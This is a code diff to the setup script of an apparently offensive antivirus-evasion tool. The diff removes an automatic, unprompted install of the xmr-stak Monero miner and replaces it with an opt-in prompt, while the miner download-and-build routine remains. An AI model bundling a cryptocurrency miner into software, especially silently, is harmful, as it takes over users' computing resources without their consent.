@@ -112,18 +112,13 @@ def kali_arch_isready():
     auto_setup("openssl")
     auto_setup("strip")
     auto_setup("wine")    
-    xmr_folder=os.path.isdir("Setup/Donate")
-    if xmr_folder == False:
-        sleep(0.5)
-        print(bcolors.OCRA + "[>] Xmr-stak setup:\n" + bcolors.ENDC)
-        xmr_setup()
     if wine_fastcheck() == True:
         sleep(0.2)
         print(bcolors.GREEN + "\n[>] Wine Env Ready\n" + bcolors.ENDC)
         sleep(0.5)
     else:       
         wine_check()
-
+    miner_advisor()
     print(bcolors.GREEN + "\n[>] Completed!!\n" + bcolors.ENDC)
     sleep(1)
 
@@ -149,18 +144,14 @@ def ubuntu_isready():
     auto_setup("openssl")
     auto_setup("strip")
     auto_setup("wine")
-    wine_check() 
-    xmr_folder=os.path.isdir("Setup/Donate")
-    if xmr_folder == False:
-        sleep(0.5)
-        print(bcolors.OCRA + "[>] Xmr-stak setup:\n" + bcolors.ENDC)
-        xmr_setup()
     if wine_fastcheck() == True:
         sleep(0.2)
         print(bcolors.GREEN + "\n[>] Wine Env Ready\n" + bcolors.ENDC)
         sleep(0.5)
     else:       
         wine_check()
+
+    miner_advisor()
 
     try:
         is_present=subprocess.check_output(['which','msfvenom'],stderr=subprocess.STDOUT)
@@ -267,9 +258,9 @@ def strip_tease(Filename):
 
 def wine_fastcheck():
     wine=False
-    wineok = open("Setup/Donate/Config.txt","r")
+    wineok = open("Setup/Config.txt","r")
     for line in wineok:
-        if "WinEnv = OK" in line:
+        if "WinEnv=OK" in line:
             wine=True
     return wine
    
@@ -319,24 +310,58 @@ def wine_check():
 
     if FLAG1=="OK":
         if FLAG2=="OK":
-                new_conf=""
-                wineok = open("Setup/Donate/Config.txt","r")
-                for line in wineok:
-                    new_conf += line
-                new_conf += "WinEnv = OK"
-                with open("Setup/Donate/Config.txt", "w") as conf:
-                    conf.write(new_conf)
+            new_conf=""
+            wineok = open("Setup/Config.txt","r")
+            for line in wineok:
+                new_conf += line.replace("WinEnv=Check","WinEnv=OK")
+            with open("Setup/Config.txt", "w") as conf:
+                conf.write(new_conf)
 
+def miner_advisor():
+    sleep(0.5)
+    py_version=platform.python_version()
+    filename="Setup/Config.txt"
+    donate_config = open(filename, "r")
+    for line in donate_config:
+        if "Miner=FirstRun" in line: 
+            print(bcolors.OCRA + "\n[Optional] XMR-STAK setup: " + bcolors.ENDC + "In order to support the developer of this tool,\nyou can help out by allowing the program to install a Monero Miner\nalong side the program's main functionality.\nThe miner will be configured to use a low amount of system resources\nduring phantom-evasion execution and can be deactivated at any time\nshould you wish to do so" + bcolors.ENDC)
+            if py_version[0] == "3": 
+                ans=input("[>]Install optional miner(y/n):")
+            else:
+                ans=raw_input("[>]Install optional miner(y/n):")
+
+            if (ans == "y") or ( ans == "Y"):
+                print("\n[>] Installing Xmr-stak\n ")
+                xmr_setup()
+                new_conf=""
+                config = open(filename, "r")
+                for line in config:
+                    line=line.replace("Miner=FirstRun","Miner=Installed")
+                    new_conf+=line
+                with open("Setup/Config.txt", "w") as configw:
+                        configw.write(new_conf)
+            else:
+                print("\n[>] Xmr-stak will not be installed\n")
+                new_conf=""
+                config = open(filename, "r")
+                for line in config:
+                    line=line.replace("Miner=FirstRun","Miner=Refused")
+                    new_conf+=line
+                with open("Setup/Config.txt", "w") as configw:
+                    configw.write(new_conf)
 
 def xmr_setup():
     os.system("xterm -e \"mkdir Setup/Donate ;cd Setup/Donate ;apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev -y ;git clone https://github.com/fireice-uk/xmr-stak.git ;mkdir xmr-stak/build ;cd xmr-stak/build ;cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF ; make install\"")
     username = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(12,16)))
-    miner_config=""
-    miner_config+="Miner = True\n"
-    miner_config+="Username = " + username + "\n"
 
-    with open("Setup/Donate/Config.txt", "w") as config:
-        config.write(miner_config)
+    with open("Setup/Config.txt", "r") as config:
+        new_conf=""
+        for line in config:
+            new_conf+=line
+        new_conf+="Mining=True\n"
+        new_conf+="Username=" + username + "\n" 
+    with open("Setup/Config.txt", "w") as config:
+        config.write(new_conf)
 
     miner_config2 = ""
     miner_config2 += "\"pool_list\" :\n"
